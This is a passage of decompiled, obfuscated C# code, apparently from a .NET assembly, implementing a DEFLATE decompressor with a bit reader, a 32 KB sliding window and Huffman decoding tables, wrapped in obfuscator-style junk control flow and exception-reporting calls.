              \u0004.\u0001.\u0002 = new int[29]
              {
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                1,
                1,
                1,
                1,
                2,
                2,
                2,
                2,
                3,
                3,
                3,
                3,
                4,
                4,
                4,
                4,
                5,
                5,
                5,
                5,
                0
              };
              if (true)
                \u0004.\u0001.\u0003 = new int[30]
                {
                  1,
                  2,
                  3,
                  4,
                  5,
                  7,
                  9,
                  13,
                  17,
                  25,
                  33,
                  49,
                  65,
                  97,
                  129,
                  193,
                  257,
                  385,
                  513,
                  769,
                  1025,
                  1537,
                  2049,
                  3073,
                  4097,
                  6145,
                  8193,
                  12289,
                  16385,
                  24577
                };
              length2 = 30;
              if (length2 == 0)
                length1 = length2;
              else
                goto label_5;
            }
            else
              break;
          }
          return;
label_5:
          int[] numArray1 = new int[length2];
          // ISSUE: field reference
          RuntimeHelpers.InitializeArray((Array) numArray1, __fieldref (\u0005.\u0001));
          \u0004.\u0001.\u0004 = numArray1;
        }
        catch (Exception ex)
        {
          \u0004.\u0002(ex);
          throw;
        }
      }
    }

    internal sealed class \u0002
    {
      private byte[] \u0001;
      private int \u0001 = 0;
      private int \u0002 = 0;
      private uint \u0001 = 0;
      private int \u0003 = 0;

      public int \u0002(int n)
      {
        int num1;
        try
        {
          while (this.\u0003 < n)
          {
            if (this.\u0001 == this.\u0002)
              return -1;
            \u0004.\u0002 obj1 = this;
            int num2 = (int) obj1.\u0001;
            byte[] numArray1 = this.\u0001;
            \u0004.\u0002 obj2 = this;
            int num3 = obj2.\u0001;
            if (true)
              goto label_13;
label_4:
            obj2.\u0001 = num3 + 1;
            int index1 = num1;
            int num4 = (int) numArray1[index1] & (int) byte.MaxValue;
            byte[] numArray2 = this.\u0001;
            \u0004.\u0002 obj3 = this;
            int num5 = obj3.\u0001;
            if (true)
              goto label_14;
label_5:
            obj3.\u0001 = num5 + 1;
            int index2 = num1;
            int num6 = ((int) numArray2[index2] & (int) byte.MaxValue) << 8;
            int num7 = (num4 | num6) << this.\u0003;
            obj1.\u0001 = (uint) (num2 | num7);
            if (true)
            {
              this.\u0003 += 16;
              break;
            }
            continue;
label_14:
            num1 = num5;
            goto label_5;
label_13:
            num1 = num3;
            goto label_4;
          }
          long num8 = (long) this.\u0001;
          int num9 = 1;
          int num10 = n;
          int num11;
          int num12;
          while (true)
          {
            int num13 = 31;
            while (true)
            {
              int num14 = num10 & num13;
              num11 = num9 << num14;
              num12 = 1;
              if (num12 != 0)
              {
                if (false)
                {
                  num13 = num12;
                  num10 = num12;
                  num9 = num11;
                }
                else
                  break;
              }
              else
                goto label_12;
            }
            if (num12 == 0)
            {
              num10 = num12;
              num9 = num11;
            }
            else
              break;
          }
label_12:
          long num15 = (long) (num11 - num12);
          return (int) (num8 & num15);
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> o1 = (ValueType) num1;
          // ISSUE: variable of a boxed type
          __Boxed<int> o3 = (ValueType) n;
          \u0004.\u0002(ex, (object) o1, (object) this, (object) o3);
          throw;
        }
      }

      public void \u0002(int n)
      {
label_0:
        try
        {
          this.\u0001 >>= n;
label_1:
          if (true)
          {
            this.\u0003 -= n;
            do
            {
              if (false)
                goto label_1;
            }
            while (false);
          }
          else
            goto label_0;
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> o2 = (ValueType) n;
          \u0004.\u0002(ex, (object) this, (object) o2);
          throw;
        }
      }

      public int AvailableBits
      {
        get
        {
          try
          {
            return this.\u0003;
          }
          catch (Exception ex)
          {
            \u0004.\u0002(ex, (object) this);
            throw;
          }
        }
      }

      public int AvailableBytes
      {
        get
        {
          try
          {
            int num1 = this.\u0002;
            int num2;
            while (true)
            {
              int num3 = this.\u0001;
              int num4 = num1 - num3;
              if (true)
              {
                if (false)
                {
                  num1 = num4;
                }
                else
                {
                  num1 = num4;
                  break;
                }
              }
              else
              {
                num2 = num4;
                goto label_5;
              }
            }
            int num5 = this.\u0003 >> 3;
            num2 = num1 + num5;
label_5:
            return num2;
          }
          catch (Exception ex)
          {
            \u0004.\u0002(ex, (object) this);
            throw;
          }
        }
      }

      public void \u0002()
      {
        try
        {
          this.\u0001 >>= this.\u0003 & 7;
          this.\u0003 &= -8;
        }
        catch (Exception ex)
        {
          \u0004.\u0002(ex, (object) this);
          throw;
        }
      }

      public bool IsNeedingInput
      {
        get
        {
          try
          {
            return this.\u0001 == this.\u0002;
          }
          catch (Exception ex)
          {
            \u0004.\u0002(ex, (object) this);
            throw;
          }
        }
      }

      public int \u0002(byte[] output, int offset, int length)
      {
        int num1;
        int num2;
        int num3;
        try
        {
          if (true)
            goto label_21;
label_4:
          int num4;
          int num5;
          while (true)
          {
            int num6;
            do
            {
              num4 = this.\u0003;
              num5 = 0;
              if (num5 == 0)
                goto label_5;
label_3:
              num6 = num4 + num5;
              continue;
label_5:
              if (num5 == 0)
              {
                if (false)
                  goto label_12;
                else
                  goto label_7;
label_2:
                this.\u0001 >>= 8;
                this.\u0003 -= 8;
                --length;
                int num7 = num1;
                num5 = 1;
                num4 = num7;
                goto label_3;
label_7:
                if (num4 > num5 && length > 0)
                {
                  output[offset++] = (byte) this.\u0001;
                  goto label_2;
                }
                else if (length != 0)
                {
                  int num8 = this.\u0002 - this.\u0001;
                  if (true)
                    goto label_23;
label_11:
                  int num9 = length;
                  num5 = num2;
                  num4 = num9;
                  goto label_12;
label_23:
                  num2 = num8;
                  goto label_11;
                }
                else
                  goto label_9;
label_12:
                if (num4 > num5)
                  length = num2;
                Array.Copy((Array) this.\u0001, this.\u0001, (Array) output, offset, length);
                this.\u0001 += length;
                if ((this.\u0001 - this.\u0002 & 1) != 0)
                {
                  byte[] numArray = this.\u0001;
                  \u0004.\u0002 obj = this;
                  int num10 = obj.\u0001;
                  if (true)
                    goto label_24;
label_16:
                  obj.\u0001 = num10 + 1;
                  int index = num3;
                  this.\u0001 = (uint) numArray[index] & (uint) byte.MaxValue;
                  this.\u0003 = 8;
                  goto label_17;
label_24:
                  num3 = num10;
                  goto label_16;
                }
label_17:
                if (false)
                  goto label_2;
                else
                  goto label_18;
              }
              else
                goto label_20;
            }
            while (false);
            num1 = num6;
          }
label_9:
          return num1;
label_18:
          if (true)
          {
            int num11 = num1;
            num5 = length;
            num4 = num11;
          }
          else
            goto label_9;
label_20:
          return num4 + num5;
label_21:
          num1 = 0;
          goto label_4;
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> o1 = (ValueType) num1;
          // ISSUE: variable of a boxed type
          __Boxed<int> o2 = (ValueType) num2;
          // ISSUE: variable of a boxed type
          __Boxed<int> o3 = (ValueType) num3;
          byte[] o5 = output;
          // ISSUE: variable of a boxed type
          __Boxed<int> o6 = (ValueType) offset;
          // ISSUE: variable of a boxed type
          __Boxed<int> o7 = (ValueType) length;
          \u0004.\u0002(ex, (object) o1, (object) o2, (object) o3, (object) this, (object) o5, (object) o6, (object) o7);
          throw;
        }
      }

      public \u0002()
      {
        try
        {
        }
        catch (Exception ex)
        {
          \u0004.\u0002(ex, (object) this);
          throw;
        }
      }

      public void \u0003()
      {
        int num1;
        try
        {
          if (false)
            goto label_5;
label_1:
          int num2 = 0;
          if (true)
            goto label_7;
label_2:
          this.\u0003 = num2;
          int num3 = num1;
          if (true)
            goto label_8;
label_3:
          this.\u0002 = num3;
          int num4 = num1;
          if (true)
            goto label_9;
label_4:
          this.\u0001 = num4;
          this.\u0001 = (uint) num1;
          goto label_5;
label_9:
          num1 = num4;
          goto label_4;
label_8:
          num1 = num3;
          goto label_3;
label_7:
          num1 = num2;
          goto label_2;
label_5:
          if (false)
            goto label_1;
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> o1 = (ValueType) num1;
          \u0004.\u0002(ex, (object) o1, (object) this);
          throw;
        }
      }

      public void \u0002(byte[] buf, int off, int len)
      {
        int num1;
        try
        {
          if (true)
          {
            if (this.\u0001 < this.\u0002)
              throw new InvalidOperationException();
            int num2 = off + len;
            if (true)
              goto label_10;
label_4:
            if (0 > off || off > num1 || num1 > buf.Length)
              throw new ArgumentOutOfRangeException();
            if ((len & 1) != 0)
            {
              this.\u0001 |= (uint) (((int) buf[off++] & (int) byte.MaxValue) << this.\u0003);
              goto label_8;
            }
            else
              goto label_9;
label_10:
            num1 = num2;
            goto label_4;
          }
label_8:
          this.\u0003 += 8;
label_9:
          this.\u0001 = buf;
          this.\u0001 = off;
          this.\u0002 = num1;
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> o1 = (ValueType) num1;
          byte[] o3 = buf;
          // ISSUE: variable of a boxed type
          __Boxed<int> o4 = (ValueType) off;
          // ISSUE: variable of a boxed type
          __Boxed<int> o5 = (ValueType) len;
          \u0004.\u0002(ex, (object) o1, (object) this, (object) o3, (object) o4, (object) o5);
          throw;
        }
      }
    }

    internal sealed class \u0003
    {
      private const int \u0001 = 32768;
      private const int \u0002 = 32767;
      private byte[] \u0001 = new byte[32768];
      private int \u0003 = 0;
      private int \u0004 = 0;

      public void \u0002(int abyte)
      {
        int num1;
        try
        {
          if (true)
          {
            \u0004.\u0003 obj = this;
            int num2 = obj.\u0004;
            if (true)
              goto label_11;
label_2:
            obj.\u0004 = num2 + 1;
            goto label_3;
label_11:
            num1 = num2;
            goto label_2;
          }
label_3:
          int num3 = num1;
          if (false)
            goto label_8;
label_4:
          if (num3 != 32768)
          {
            byte[] numArray = this.\u0001;
            \u0004.\u0003 obj = this;
            int num4 = obj.\u0003;
            if (true)
              goto label_12;
label_7:
            obj.\u0003 = num4 + 1;
            int index = num1;
            int num5 = (int) (byte) abyte;
            numArray[index] = (byte) num5;
            num3 = 0;
            goto label_8;
label_12:
            num1 = num4;
            goto label_7;
          }
label_5:
          throw new InvalidOperationException();
label_8:
          if (true)
          {
            if (num3 == 0)
              this.\u0003 &= (int) short.MaxValue;
            else
              goto label_5;
          }
          else
            goto label_4;
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> o1 = (ValueType) num1;
          // ISSUE: variable of a boxed type
          __Boxed<int> o3 = (ValueType) abyte;
          \u0004.\u0002(ex, (object) o1, (object) this, (object) o3);
          throw;
        }
      }

      private void \u0002(int repStart, int len, int dist)
      {
        int num1;
        try
        {
          int num2 = 0;
          if (num2 == 0)
          {
            if (num2 == 0)
              goto label_7;
          }
          else
            goto label_8;
label_3:
          if (false)
            return;
          byte[] numArray = this.\u0001;
          \u0004.\u0003 obj = this;
          int num3 = obj.\u0003;
          if (true)
            goto label_11;
label_5:
          obj.\u0003 = num3 + 1;
          int index = num1;
          int num4 = (int) this.\u0001[repStart++];
          numArray[index] = (byte) num4;
          this.\u0003 &= (int) short.MaxValue;
          goto label_6;
label_11:
          num1 = num3;
          goto label_5;
label_6:
          repStart &= (int) short.MaxValue;
label_7:
          num2 = 5;
label_8:
          if (num2 != 0)
          {
            if (len-- > 0)
              goto label_3;
          }
          else
            goto label_6;
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> o1 = (ValueType) num1;
          // ISSUE: variable of a boxed type
          __Boxed<int> o3 = (ValueType) repStart;
          // ISSUE: variable of a boxed type
          __Boxed<int> o4 = (ValueType) len;
          // ISSUE: variable of a boxed type
          __Boxed<int> o5 = (ValueType) dist;
          \u0004.\u0002(ex, (object) o1, (object) this, (object) o3, (object) o4, (object) o5);
          throw;
        }
      }

      public void \u0002(int len, int dist)
      {
        int num1;
        int num2;
        int num3;
        try
        {
          \u0004.\u0003 obj1 = this;
          int num4 = obj1.\u0004 + len;
          if (true)
            goto label_13;
label_1:
          obj1.\u0004 = num4;
          if (num1 > 32768)
            throw new InvalidOperationException();
          int num5 = this.\u0003 - dist & (int) short.MaxValue;
          if (true)
            goto label_14;
label_4:
          int num6 = 32768 - len;
          if (true)
            goto label_15;
label_5:
          if (num2 <= num3 && this.\u0003 < num3)
          {
            if (len <= dist)
            {
              Array.Copy((Array) this.\u0001, num2, (Array) this.\u0001, this.\u0003, len);
              this.\u0003 += len;
              return;
            }
            while (len-- > 0)
            {
              byte[] numArray1 = this.\u0001;
              \u0004.\u0003 obj2 = this;
              int num7 = obj2.\u0003;
              if (true)
                goto label_16;
label_9:
              obj2.\u0003 = num7 + 1;
              int index1 = num1;
              byte[] numArray2 = this.\u0001;
              int index2 = num2;
              int num8 = index2 + 1;
              if (true)
                goto label_17;
label_10:
              int num9 = (int) numArray2[index2];
              numArray1[index1] = (byte) num9;
              continue;
label_17:
              num2 = num8;
              goto label_10;
label_16:
              num1 = num7;
              goto label_9;
            }
            return;
          }
          this.\u0002(num2, len, dist);
          return;
label_15:
          num3 = num6;
          goto label_5;
label_14:
          num2 = num5;
          goto label_4;
label_13:
          num1 = num4;
          goto label_1;
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> o1 = (ValueType) num2;
          // ISSUE: variable of a boxed type
          __Boxed<int> o2 = (ValueType) num3;
          // ISSUE: variable of a boxed type
          __Boxed<int> o3 = (ValueType) num1;
          // ISSUE: variable of a boxed type
          __Boxed<int> o5 = (ValueType) len;
          // ISSUE: variable of a boxed type
          __Boxed<int> o6 = (ValueType) dist;
          \u0004.\u0002(ex, (object) o1, (object) o2, (object) o3, (object) this, (object) o5, (object) o6);
          throw;
        }
      }

      public int \u0002(\u0004.\u0002 input, int len)
      {
        int length;
        int num1;
        try
        {
          int val1 = len;
          if (true)
          {
            int val2 = 32768;
            if (val2 != 0)
              val2 -= this.\u0004;
            len = Math.Min(Math.Min(val1, val2), input.AvailableBytes);
            val1 = 32768;
          }
          int num2 = this.\u0003;
          while (true)
          {
            int num3 = val1 - num2;
            if (true)
              goto label_14;
label_6:
            int num4;
            int num5;
            do
            {
              if (len > length)
              {
                int num6 = input.\u0002(this.\u0001, this.\u0003, length);
                if (true)
                  goto label_15;
label_8:
                num4 = num1;
                num5 = length;
                if (true)
                {
                  if (num4 == num5)
                  {
                    int num7 = num1 + input.\u0002(this.\u0001, 0, len - length);
                    if (true)
                    {
                      num1 = num7;
                      goto label_12;
                    }
                    else
                      goto label_12;
                  }
                  else
                    goto label_12;
                }
                else
                  goto label_19;
label_15:
                num1 = num6;
                goto label_8;
              }
              else
              {
                int num8 = input.\u0002(this.\u0001, this.\u0003, len);
                if (true)
                  num1 = num8;
              }
label_12:
              this.\u0003 = this.\u0003 + num1 & (int) short.MaxValue;
            }
            while (false);
            break;
label_19:
            num2 = num5;
            val1 = num4;
            continue;
label_14:
            length = num3;
            goto label_6;
          }
          this.\u0004 += num1;
          return num1;
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> o1 = (ValueType) num1;
          // ISSUE: variable of a boxed type
          __Boxed<int> o2 = (ValueType) length;
          \u0004.\u0002 o4 = input;
          // ISSUE: variable of a boxed type
          __Boxed<int> o5 = (ValueType) len;
          \u0004.\u0002(ex, (object) o1, (object) o2, (object) this, (object) o4, (object) o5);
          throw;
        }
      }

      public void \u0002(byte[] dict, int offset, int len)
      {
        try
        {
          if (this.\u0004 > 0)
            throw new InvalidOperationException();
          int num1 = len;
          int num2;
          for (int index = 32768; num1 > index; num1 = num2)
          {
            num2 = offset;
            int num3 = len;
            if (false)
            {
              index = num3;
            }
            else
            {
              int num4 = num3 - 32768;
              offset = num2 + num4;
              len = 32768;
              break;
            }
          }
          Array.Copy((Array) dict, offset, (Array) this.\u0001, 0, len);
          this.\u0003 = len & (int) short.MaxValue;
        }
        catch (Exception ex)
        {
          byte[] o2 = dict;
          // ISSUE: variable of a boxed type
          __Boxed<int> o3 = (ValueType) offset;
          // ISSUE: variable of a boxed type
          __Boxed<int> o4 = (ValueType) len;
          \u0004.\u0002(ex, (object) this, (object) o2, (object) o3, (object) o4);
          throw;
        }
      }

      public int \u0002()
      {
        try
        {
          return 32768 - this.\u0004;
        }
        catch (Exception ex)
        {
          \u0004.\u0002(ex, (object) this);
          throw;
        }
      }

      public int \u0003()
      {
        try
        {
          return this.\u0004;
        }
        catch (Exception ex)
        {
          \u0004.\u0002(ex, (object) this);
          throw;
        }
      }

      public int \u0002(byte[] output, int offset, int len)
      {
        int num1;
        int length;
        int num2;
        try
        {
          int num3 = this.\u0003;
          if (true)
            goto label_17;
label_1:
          int num4 = len;
          int num5;
          int num6;
          int num7;
          while (true)
          {
            int num8 = this.\u0004;
            if (num4 <= num8)
            {
              num5 = this.\u0003 - this.\u0004;
              num6 = len;
              if (true)
              {
                num7 = num5 + num6;
                if (false)
                  num4 = num7;
                else
                  goto label_23;
              }
              else
                goto label_12;
            }
            else
              break;
          }
          len = this.\u0004;
          goto label_7;
label_6:
          int num9;
          int num10 = num9 & (int) short.MaxValue;
          if (true)
          {
            num1 = num10;
            goto label_7;
          }
          else
            goto label_7;
label_23:
          num9 = num7;
          goto label_6;
label_7:
          int num11 = len;
          if (true)
            goto label_19;
label_8:
          num9 = len;
          if (true)
          {
            int num12 = num1;
            int num13 = num9 - num12;
            if (true)
              goto label_20;
label_10:
            if (length > 0)
            {
              Array.Copy((Array) this.\u0001, 32768 - length, (Array) output, offset, length);
              int num14 = offset;
              num6 = length;
              num5 = num14;
              goto label_12;
            }
            else
              goto label_13;
label_20:
            length = num13;
            goto label_10;
          }
          else
            goto label_6;
label_19:
          num2 = num11;
          goto label_8;
label_12:
          offset = num5 + num6;
          len = num1;
label_13:
          Array.Copy((Array) this.\u0001, num1 - len, (Array) output, offset, len);
          this.\u0004 -= num2;
          if (this.\u0004 < 0)
            throw new InvalidOperationException();
          if (true)
            return num2;
          goto label_7;
label_17:
          num1 = num3;
          goto label_1;
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> o1 = (ValueType) num1;
          // ISSUE: variable of a boxed type
          __Boxed<int> o2 = (ValueType) num2;
          // ISSUE: variable of a boxed type
          __Boxed<int> o3 = (ValueType) length;
          byte[] o5 = output;
          // ISSUE: variable of a boxed type
          __Boxed<int> o6 = (ValueType) offset;
          // ISSUE: variable of a boxed type
          __Boxed<int> o7 = (ValueType) len;
          \u0004.\u0002(ex, (object) o1, (object) o2, (object) o3, (object) this, (object) o5, (object) o6, (object) o7);
          throw;
        }
      }

      public void \u0002()
      {
        int num1;
        try
        {
          int num2 = 0;
          if (true)
            goto label_2;
label_1:
          this.\u0003 = num2;
          this.\u0004 = num1;
          return;
label_2:
          num1 = num2;
          goto label_1;
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> o1 = (ValueType) num1;
          \u0004.\u0002(ex, (object) o1, (object) this);
          throw;
        }
      }

      public \u0003()
      {
        try
        {
        }
        catch (Exception ex)
        {
          \u0004.\u0002(ex, (object) this);
          throw;
        }
      }
    }

    internal sealed class \u0004
    {
      private const int \u0001 = 15;
      private short[] \u0001;
      public static readonly \u0004.\u0004 \u0001;
      public static readonly \u0004.\u0004 \u0002;

      static \u0004()
      {
label_0:
        byte[] codeLengths;
        int num1;
        try
        {
          byte[] numArray1 = new byte[288];
          if (true)
            goto label_22;
label_1:
          if (true)
            goto label_23;
label_2:
          if (true)
          {
            while (num1 < 144)
            {
              byte[] numArray2 = codeLengths;
              int index = num1;
              int num2 = index + 1;
              if (true)
                goto label_24;
label_4:
              numArray2[index] = (byte) 8;
              continue;
label_24:
              num1 = num2;
              goto label_4;
            }
            while (num1 < 256)
            {
              byte[] numArray3 = codeLengths;
              int index = num1;
              int num3 = index + 1;
              if (true)
                goto label_25;
label_7:
              numArray3[index] = (byte) 9;
              continue;
label_25:
              num1 = num3;
              goto label_7;
            }
          }
          else
            goto label_12;
label_11:
          while (num1 < 280)
          {
            byte[] numArray4 = codeLengths;
            int index = num1;
            int num4 = index + 1;
            if (true)
              goto label_26;
label_10:
            numArray4[index] = (byte) 7;
            continue;
label_26:
            num1 = num4;
            goto label_10;
          }
          goto label_14;
label_12:
          byte[] numArray5 = codeLengths;
          int index1 = num1;
          int num5 = index1 + 1;
          if (true)
            goto label_27;
label_13:
          numArray5[index1] = (byte) 8;
          goto label_14;
label_27:
          num1 = num5;
          goto label_13;
label_14:
          if (num1 >= 288)
          {
            if (true)
            {
              \u0004.\u0004.\u0001 = new \u0004.\u0004(codeLengths);
              codeLengths = new byte[32];
              num1 = 0;
              while (num1 < 32)
                codeLengths[num1++] = (byte) 5;
              while (true)
              {
                \u0004.\u0004.\u0002 = new \u0004.\u0004(codeLengths);
                if (true)
                  return;
              }
              goto label_11;
            }
            else
              goto label_0;
          }
          else
            goto label_12;
label_23:
          num1 = 0;
          goto label_2;
label_22:
          codeLengths = numArray1;
          goto label_1;
        }
        catch (Exception ex)
        {
          byte[] o1 = codeLengths;
          // ISSUE: variable of a boxed type
          __Boxed<int> o2 = (ValueType) num1;
          \u0004.\u0002(ex, (object) o1, (object) o2);
          throw;
        }
      }

      public \u0004(byte[] codeLengths)
      {
        try
        {
          this.\u0002(codeLengths);
        }
        catch (Exception ex)
        {
          byte[] o2 = codeLengths;
          \u0004.\u0002(ex, (object) this, (object) o2);
          throw;
        }
      }

      private void \u0002(byte[] codeLengths)
      {
        int index1;
        int num1;
        int[] numArray1;
        int[] numArray2;
        int toReverse1;
        int length;
        int index2;
        int[] numArray3;
        int num2;
        int num3;
        int num4;
        int index3;
        int num5;
        int num6;
        int toReverse2;
        int index4;
        int codeLength1;
        int index5;
        int num7;
        int num8;
        int index6;
        try
        {
          int[] numArray4 = new int[16];
          if (true)
            goto label_40;
label_1:
          int[] numArray5 = new int[16];
          if (true)
            goto label_41;
label_2:
          if (true)
            goto label_42;
label_9:
          for (; index1 < codeLengths.Length; ++index1)
          {
            int codeLength2 = (int) codeLengths[index1];
            if (true)
              goto label_43;
label_4:
            if (num1 > 0)
            {
              int[] numArray6 = numArray1;
              if (true)
                goto label_44;
label_6:
              int index7 = num1;
              if (true)
                goto label_45;
label_7:
              numArray6[index7] = numArray2[(IntPtr) index6] + 1;
              continue;
label_45:
              index6 = index7;
              goto label_7;
label_44:
              numArray2 = numArray6;
              goto label_6;
            }
            else
              continue;
label_43:
            num1 = codeLength2;
            goto label_4;
          }
          toReverse1 = 0;
          length = 512;
          for (index2 = 1; index2 <= 15; ++index2)
          {
            numArray3[index2] = toReverse1;
            toReverse1 += numArray1[index2] << 16 - index2;
            if (index2 >= 10)
            {
              num2 = numArray3[index2] & 130944;
              if (true)
              {
                if (true)
                {
                  num3 = toReverse1 & 130944;
                  length += num3 - num2 >> 16 - index2;
                }
                else
                  goto label_21;
              }
              else
                goto label_29;
            }
          }
          this.\u0001 = new short[(int) checked ((uint) length)];
          num4 = 512;
          int num9 = 15;
label_18:
          index3 = num9;
          goto label_25;
label_21:
          for (toReverse2 = num6; toReverse2 < num5; toReverse2 += 128)
          {
            this.\u0001[(int) \u0004.\u0007.\u0002(toReverse2)] = (short) (-num4 << 4 | index3);
            num4 += 1 << index3 - 9;
          }
          --index3;
label_25:
          if (index3 >= 10)
          {
            num5 = toReverse1 & 130944;
            num9 = toReverse1 - (numArray1[index3] << 16 - index3);
            if (true)
            {
              toReverse1 = num9;
              num6 = toReverse1 & 130944;
              goto label_21;
            }
            else
              goto label_18;
          }
label_26:
          index4 = 0;
          goto label_37;
label_29:
          int num10;
          int num11;
          if (true)
          {
            if (codeLength1 <= 9)
            {
              do
              {
                this.\u0001[index5] = (short) (index4 << 4 | codeLength1);
                index5 += 1 << codeLength1;
              }
              while (index5 < 512);
            }
            else
            {
              num7 = (int) this.\u0001[index5 & 511];
              int num12 = 1;
              int num13 = num7 & 15;
              if (true)
              {
                int num14 = num13 & 31;
                num8 = num12 << num14;
                num7 = -(num7 >> 4);
                do
                {
                  this.\u0001[num7 | index5 >> 9] = (short) (index4 << 4 | codeLength1);
                  index5 += 1 << codeLength1;
                }
                while (index5 < num8);
              }
              else
              {
                num11 = num13;
                num10 = num12;
                goto label_38;
              }
            }
            numArray3[codeLength1] = toReverse1 + (1 << 16 - codeLength1);
          }
          else
            goto label_26;
label_36:
          ++index4;
label_37:
          num10 = index4;
          num11 = codeLengths.Length;
label_38:
          if (num10 >= num11)
            return;
          codeLength1 = (int) codeLengths[index4];
          if (codeLength1 != 0)
          {
            toReverse1 = numArray3[codeLength1];
            index5 = (int) \u0004.\u0007.\u0002(toReverse1);
            goto label_29;
          }
          else
            goto label_36;
label_42:
          index1 = 0;
          goto label_9;
label_41:
          numArray3 = numArray5;
          goto label_2;
label_40:
          numArray1 = numArray4;
          goto label_1;
        }
        catch (Exception ex)
        {
          object[] objects = new object[23]
          {
            (object) numArray1,
            (object) numArray3,
            (object) index1,
            (object) num1,
            (object) toReverse1,
            (object) length,
            (object) index2,
            (object) num2,
            (object) num3,
            (object) num4,
            (object) index3,
            (object) num5,
            (object) num6,
            (object) toReverse2,
            (object) index4,
            (object) codeLength1,
            (object) index5,
            (object) num7,
            (object) num8,
            (object) numArray2,
            (object) (IntPtr) index6,
            (object) this,
            (object) codeLengths
          };
          \u0004.\u0002(ex, objects);
          throw;
        }
      }

      public int \u0002(\u0004.\u0002 input)
      {
        int index;
        int num1;
        int n;
        int num2;
        int availableBits1;
        int availableBits2;
        try
        {
          int num3 = input.\u0002(9);
          int num4;
          int num5;
          int num6;
          while (true)
          {
            if (true)
              goto label_27;
label_2:
            if (num3 >= 0)
            {
              int num7 = (int) this.\u0001[index];
              if (false)
              {
                num4 = num7;
              }
              else
              {
                num1 = num7;
                num4 = num7;
              }
            }
            else
              goto label_22;
label_5:
            if (num4 < 0)
            {
              int num8 = -(num1 >> 4);
              if (true)
                goto label_29;
label_8:
              int num9 = num1 & 15;
              if (true)
                goto label_30;
label_9:
              num4 = input.\u0002(n);
              goto label_10;
label_30:
              n = num9;
              goto label_9;
label_29:
              num2 = num8;
              goto label_8;
            }
            else
              break;
label_10:
            if (true)
              num5 = num4;
            else
              goto label_5;
label_12:
            if (true)
              goto label_31;
label_13:
            if (true)
            {
              if (num4 >= 0)
              {
                int num10 = (int) this.\u0001[num2 | index >> 9];
                if (true)
                  goto label_32;
label_16:
                if (false)
                  goto label_22;
                else
                  goto label_17;
label_32:
                num1 = num10;
                goto label_16;
              }
              else
              {
                availableBits1 = input.AvailableBits;
                index = input.\u0002(availableBits1);
                num1 = (int) this.\u0001[num2 | index >> 9];
                if ((num1 & 15) <= availableBits1)
                {
                  input.\u0002(num1 & 15);
                  num6 = num1 >> 4;
                  if (false)
                  {
                    num3 = num6;
                    continue;
                  }
                  goto label_20;
                }
                else
                  goto label_21;
              }
            }
            else
              goto label_10;
label_31:
            index = num5;
            goto label_13;
label_22:
            availableBits2 = input.AvailableBits;
            index = input.\u0002(availableBits2);
            num1 = (int) this.\u0001[index];
            if (num1 >= 0)
            {
              num4 = num1;
              num5 = 15;
              if (num5 == 0)
                goto label_12;
              else
                goto label_24;
            }
            else
              goto label_26;
label_27:
            index = num3;
            goto label_2;
          }
          input.\u0002(num1 & 15);
          return num1 >> 4;
label_17:
          input.\u0002(num1 & 15);
          return num1 >> 4;
label_20:
          return num6;
label_21:
          return -1;
label_24:
          if ((num4 & num5) <= availableBits2)
          {
            input.\u0002(num1 & 15);
            return num1 >> 4;
          }
label_26:
          return -1;
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> o1 = (ValueType) index;
          // ISSUE: variable of a boxed type
          __Boxed<int> o2 = (ValueType) num1;
          // ISSUE: variable of a boxed type
          __Boxed<int> o3 = (ValueType) num2;
          // ISSUE: variable of a boxed type
          __Boxed<int> o4 = (ValueType) n;
          // ISSUE: variable of a boxed type
          __Boxed<int> o5 = (ValueType) availableBits1;
          // ISSUE: variable of a boxed type
          __Boxed<int> o6 = (ValueType) availableBits2;
          \u0004.\u0002 o8 = input;
          \u0004.\u0002(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) o5, (object) o6, (object) this, (object) o8);
          throw;
        }
      }
    }

    internal sealed class \u0005
    {
      private const int \u0001 = 0;
      private const int \u0002 = 1;
      private const int \u0003 = 2;
      private const int \u0004 = 3;
      private const int \u0005 = 4;
      private const int \u0006 = 5;
      private static readonly int[] \u0001;
      private static readonly int[] \u0002;
      private byte[] \u0001;
      private byte[] \u0002;
      private \u0004.\u0004 \u0001;
      private int \u0007;
      private int \u0008;
      private int \u000E;
      private int \u000F;
      private int \u0010;
      private int \u0011;
      private byte \u0001;
      private int \u0012;
      private static readonly int[] \u0003;

      public \u0005()
      {
        try
        {
        }
        catch (Exception ex)
        {
          \u0004.\u0002(ex, (object) this);
          throw;
        }
      }

      public bool \u0002(\u0004.\u0002 input)
      {
        int num1;
        int num2;
        int num3;
        byte num4;
        int n;
        int num5;
        try
        {
          while (true)
          {
            int num6 = this.\u0007;
            if (true)
              goto label_37;
label_1:
            switch (num1)
            {
              case 0:
                this.\u0008 = input.\u0002(5);
                if (this.\u0008 >= 0)
                {
                  this.\u0008 += 257;
                  input.\u0002(5);
                  this.\u0007 = 1;
                  goto case 1;
                }
                else
                  goto label_3;
              case 1:
                this.\u000E = input.\u0002(5);
                if (this.\u000E >= 0)
                {
                  ++this.\u000E;
                  input.\u0002(5);
                  this.\u0010 = this.\u0008 + this.\u000E;
                  this.\u0002 = new byte[(int) checked ((uint) this.\u0010)];
                  this.\u0007 = 2;
                  goto case 2;
                }
                else
                  goto label_6;
              case 2:
                this.\u000F = input.\u0002(4);
                if (this.\u000F >= 0)
                {
                  this.\u000F += 4;
                  input.\u0002(4);
                  this.\u0001 = new byte[19];
                  this.\u0012 = 0;
                  this.\u0007 = 3;
                  goto case 3;
                }
                else
                  goto label_9;
              case 3:
                for (; this.\u0012 < this.\u000F; ++this.\u0012)
                {
                  int num7 = input.\u0002(3);
                  if (true)
                    goto label_38;
